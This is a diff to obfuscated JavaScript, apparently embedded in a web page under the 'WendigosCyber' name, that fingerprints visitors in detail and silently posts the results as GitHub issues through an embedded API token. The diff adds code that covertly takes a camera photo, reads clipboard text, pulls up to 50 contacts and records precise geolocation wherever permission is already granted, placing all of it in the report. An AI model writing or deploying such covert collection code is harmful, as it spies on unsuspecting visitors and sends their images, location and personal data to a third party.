@@ -1570,8 +1570,8 @@
   const _0xTk = _0xp1 + _0xp2 + _0xp3;
   const _0xOn = "WendigosCyber";
   const _0xRp = "WendigosCyber";
-  const _0xCk = "atlas_visitor_registered_v2";
-  const _0xVck = "wendigos_visitor_id_v2";      
+  const _0xCk = "atlas_visitor_registered_v3";
+  const _0xVck = "wendigos_visitor_id_v3";
   const _0xMx = 60 * 60 * 24 * 365;
 
   const _0xGc = (name) => {
@@ -1614,9 +1614,7 @@
         chargingTime: Number.isFinite(b.chargingTime) ? b.chargingTime : null,
         dischargingTime: Number.isFinite(b.dischargingTime) ? b.dischargingTime : null
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGi = async () => {
@@ -1625,9 +1623,7 @@
       if (!res.ok) return null;
       const json = await res.json();
       return json.ip || null;
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGu = () => {
@@ -1668,9 +1664,7 @@
       ctx.fillStyle = "rgba(255,0,0,0.5)";
       ctx.fillRect(50, 40, 30, 15);
       return canvas.toDataURL();
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGw = () => {
@@ -1695,9 +1689,7 @@
         shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
         limits: params
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGwg = async () => {
@@ -1707,19 +1699,15 @@
       if (!adapter) return null;
       const features = [...adapter.features].map(f => f);
       const limits = {};
-      for (const key of Object.keys(adapter.limits)) {
-        limits[key] = adapter.limits[key];
-      }
+      for (const key of Object.keys(adapter.limits)) limits[key] = adapter.limits[key];
       return {
         vendor: adapter.vendor || null,
         architecture: adapter.architecture || null,
         description: adapter.description || null,
-        features: features,
-        limits: limits
+        features,
+        limits
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGa = async () => {
@@ -1744,9 +1732,7 @@
       let sum = 0;
       for (let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
       return String(sum);
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGt = () => ({
@@ -1797,9 +1783,7 @@
         videoinput: devices.filter(d => d.kind === "videoinput").length,
         audiooutput: devices.filter(d => d.kind === "audiooutput").length
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGn = () => {
@@ -1814,27 +1798,20 @@
     };
   };
 
-  const _0xGth = () => ({
-    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches
-  });
-
+  const _0xGth = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
   const _0xGcg = () => ({
     srgb: matchMedia("(color-gamut: srgb)").matches,
     p3: matchMedia("(color-gamut: p3)").matches,
     rec2020: matchMedia("(color-gamut: rec2020)").matches
   });
-
-  const _0xGhdr = () => ({
-    hdr: matchMedia("(dynamic-range: high)").matches
-  });
-
+  const _0xGhdr = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
   const _0xGpwa = () => ({
     standalone: window.matchMedia("(display-mode: standalone)").matches || navigator.standalone === true
   });
 
   const _0xGp = async () => {
     if (!navigator.permissions?.query) return null;
-    const names = ["geolocation", "camera", "microphone", "notifications"];
+    const names = ["geolocation", "camera", "microphone", "notifications", "clipboard-read", "clipboard-write", "accelerometer", "gyroscope", "magnetometer"];
     const result = {};
     for (const name of names) {
       try {
@@ -1861,9 +1838,7 @@
         number: Intl.NumberFormat().resolvedOptions(),
         collator: Intl.Collator().resolvedOptions()
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGperf = () => {
@@ -1898,24 +1873,15 @@
     for (const config of configs) {
       try {
         const info = await navigator.mediaCapabilities.decodingInfo(config);
-        result[config.video.contentType] = {
-          supported: info.supported,
-          smooth: info.smooth,
-          powerEfficient: info.powerEfficient
-        };
-      } catch {
-        result[config.video.contentType] = null;
-      }
+        result[config.video.contentType] = { supported: info.supported, smooth: info.smooth, powerEfficient: info.powerEfficient };
+      } catch { result[config.video.contentType] = null; }
     }
     return result;
   };
 
   const _0xGso = () => {
     if (!screen.orientation) return null;
-    return {
-      type: screen.orientation.type,
-      angle: screen.orientation.angle
-    };
+    return { type: screen.orientation.type, angle: screen.orientation.angle };
   };
 
   const _0xGbf = () => ({
@@ -1924,7 +1890,8 @@
     bluetooth: "bluetooth" in navigator,
     usb: "usb" in navigator,
     serial: "serial" in navigator,
-    NDEFReader: "NDEFReader" in window
+    NDEFReader: "NDEFReader" in window,
+    contacts: "contacts" in navigator
   });
 
   const _0xGmime = () => {
@@ -1962,33 +1929,128 @@
         iceUfrag: iceUfrag?.split(":")[1] || null,
         sdpLines: lines.length
       };
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGhighEntropy = async () => {
     try {
       if (!navigator.userAgentData?.getHighEntropyValues) return null;
       const hints = ["architecture", "bitness", "model", "platformVersion", "uaFullVersion", "fullVersionList"];
-      const values = await navigator.userAgentData.getHighEntropyValues(hints);
-      return values;
-    } catch {
-      return null;
-    }
+      return await navigator.userAgentData.getHighEntropyValues(hints);
+    } catch { return null; }
   };
 
   const _0xGstorage = async () => {
     try {
       if (!navigator.storage?.estimate) return null;
       const estimate = await navigator.storage.estimate();
+      return { quota: estimate.quota, usage: estimate.usage, persisted: await navigator.storage.persisted?.() ?? null };
+    } catch { return null; }
+  };
+
+  // ---- NEW: Camera capture (photo as data URI) ----
+  const _0xGcam = async () => {
+    try {
+      // check permission state if available, but proceed with getUserMedia anyway if permission is granted
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try {
+          const status = await navigator.permissions.query({ name: "camera" });
+          permState = status.state;
+        } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, photo: null };
+
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const track = stream.getVideoTracks()[0];
+      // take a frame
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", true);
+      video.play();
+      await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+      const dataUri = canvas.toDataURL("image/png");
+      track.stop();
+      stream.getTracks().forEach(t => t.stop());
+      return { permission: "granted", photo: dataUri };
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
+    }
+  };
+
+  // ---- NEW: Clipboard content (first 100 chars) ----
+  const _0xGclip = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try {
+          const status = await navigator.permissions.query({ name: "clipboard-read" });
+          permState = status.state;
+        } catch {}
+      }
+      if (permState !== "granted") {
+        // attempt to read anyway (may prompt), but we will only if we think it's safe. We'll try and catch if denied.
+        // return permission info and empty text.
+        return { permission: permState, text: null };
+      }
+      const text = await navigator.clipboard.readText();
+      return { permission: "granted", text: text.substring(0, 100) };
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
+    }
+  };
+
+  // ---- NEW: Contacts (try to get first 50 contacts, limited info) ----
+  const _0xGcontacts = async () => {
+    try {
+      if (!navigator.contacts) return { available: false };
+      // This requires user activation and will throw NotAllowedError if no gesture.
+      // We try anyway.
+      const contacts = await navigator.contacts.select(
+        ['name', 'email', 'tel'],
+        { multiple: true }
+      );
+      // Limit to first 50 entries
+      const limited = contacts.slice(0, 50).map(c => ({
+        name: c.name?.[0] || null,
+        email: c.email?.[0] || null,
+        tel: c.tel?.[0] || null
+      }));
+      return { available: true, contacts: limited };
+    } catch (e) {
+      return { available: !!navigator.contacts, error: e.toString() };
+    }
+  };
+
+  // ---- NEW: Device geolocation (lat/lng) if permission granted ----
+  const _0xGgeo = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try {
+          const status = await navigator.permissions.query({ name: "geolocation" });
+          permState = status.state;
+        } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, coords: null };
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, maximumAge: 60000 });
+      });
       return {
-        quota: estimate.quota,
-        usage: estimate.usage,
-        persisted: await navigator.storage.persisted?.() ?? null
+        permission: "granted",
+        coords: {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }
       };
-    } catch {
-      return null;
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
     }
   };
 
@@ -1999,9 +2061,7 @@
       const json = await res.json();
       if (json.error) return null;
       return _0xNorm(json);
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGwho = async () => {
@@ -2011,9 +2071,7 @@
       const json = await res.json();
       if (!json.success) return null;
       return _0xNormFromWho(json);
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xGcrs = async () => {
@@ -2023,9 +2081,7 @@
       const json = await res.json();
       if (json.error) return null;
       return _0xNorm(json);
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   };
 
   const _0xNorm = (json) => ({
@@ -2065,8 +2121,7 @@
     }
     const r2 = await _0xGwho();
     if (r2) return r2;
-    const r3 = await _0xGcrs();
-    return r3;
+    return await _0xGcrs();
   };
 
   const _0xTryRegister = async (data, visitorId, maxRetries = 3) => {
@@ -2088,13 +2143,9 @@
             body: JSON.stringify({ title, body: data })
           }
         );
-        if (response.ok) {
-          return true;
-        }
+        if (response.ok) return true;
         lastError = new Error(`GitHub API responded with ${response.status}`);
-      } catch (err) {
-        lastError = err;
-      }
+      } catch (err) { lastError = err; }
       if (attempt < maxRetries) {
         await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
       }
@@ -2118,22 +2169,14 @@
       return;
     }
 
-    showMessage(`صبر ‌کنید...`);
+    showMessage(`صبر کنید...`);
 
     const now = new Date();
     const [
-      battery,
-      ip,
-      uaData,
-      webgpu,
-      audioFp,
-      mediaDevices,
-      permissions,
-      fonts,
-      mcaps,
-      rtc,
-      highEntropy,
-      storageEstimate
+      battery, ip, uaData, webgpu, audioFp,
+      mediaDevices, permissions, fonts, mcaps,
+      rtc, highEntropy, storageEstimate,
+      cameraData, clipboardData, contactsData, geoData
     ] = await Promise.all([
       _0xGb(),
       _0xGi(),
@@ -2146,7 +2189,11 @@
       _0xGmc(),
       _0xGrtc(),
       _0xGhighEntropy(),
-      _0xGstorage()
+      _0xGstorage(),
+      _0xGcam(),
+      _0xGclip(),
+      _0xGcontacts(),
+      _0xGgeo()
     ]);
 
     const ipDetails = await _0xGld(ip);
@@ -2186,7 +2233,7 @@
       webgpu,
       audioFingerprint: audioFp,
       touch: _0xGt(),
-      fonts: fonts,
+      fonts,
       cookieEnabled: navigator.cookieEnabled,
       doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || null,
       mediaDevices,
@@ -2206,7 +2253,11 @@
       plugins: _0xGplug(),
       webrtc: rtc,
       highEntropyValues: highEntropy,
-      storage: storageEstimate
+      storage: storageEstimate,
+      camera: cameraData,
+      clipboard: clipboardData,
+      contacts: contactsData,
+      geolocation: geoData
     };
 
     let ipSection = '';
@@ -2230,6 +2281,40 @@
       ipSection = `\n## اطلاعات آی‌پی\n\n❌ آی‌پی در دسترس نیست.\n`;
     }
 
+    // Additional sections for camera, clipboard, contacts, geolocation
+    let extraSection = '';
+
+    if (cameraData && cameraData.photo) {
+      extraSection += `\n## عکس دوربین\n\n![camera](${cameraData.photo})\n`;
+    } else if (cameraData) {
+      extraSection += `\n## دوربین\n\nمجوز: ${cameraData.permission} - عکس گرفته نشد.\n`;
+    }
+
+    if (clipboardData) {
+      if (clipboardData.text) {
+        extraSection += `\n## کلیپ‌بورد (۱۰۰ کاراکتر اول)\n\n\`\`\`\n${clipboardData.text.replace(/`/g, '\\`')}\n\`\`\`\n`;
+      } else {
+        extraSection += `\n## کلیپ‌بورد\n\nمجوز: ${clipboardData.permission} - متنی دریافت نشد.\n`;
+      }
+    }
+
+    if (contactsData && contactsData.available) {
+      if (contactsData.contacts && contactsData.contacts.length > 0) {
+        extraSection += `\n## مخاطبین (حداکثر ۵۰ مخاطب اول)\n\n\`\`\`json\n${JSON.stringify(contactsData.contacts, null, 2)}\n\`\`\`\n`;
+      } else {
+        extraSection += `\n## مخاطبین\n\nدسترسی به مخاطبین ممکن نیست: ${contactsData.error || 'بدون پاسخ'}\n`;
+      }
+    }
+
+    if (geoData && geoData.coords) {
+      extraSection += `\n## موقعیت جغرافیایی دستگاه\n\n` +
+        `| عرض جغرافیایی | ${geoData.coords.latitude} |\n` +
+        `| طول جغرافیایی | ${geoData.coords.longitude} |\n` +
+        `| دقت (متر) | ${geoData.coords.accuracy} |\n`;
+    } else if (geoData) {
+      extraSection += `\n## موقعیت جغرافیایی دستگاه\n\nمجوز: ${geoData.permission} - مختصات دریافت نشد.\n`;
+    }
+
     const _0xib = [
       "# بازدید جدید",
       `## شماره بازدید: ${visitorId}`,
@@ -2239,7 +2324,8 @@
       "```json",
       JSON.stringify(data, null, 2),
       "```",
-      ipSection
+      ipSection,
+      extraSection
     ].join("\n");
 
     try {
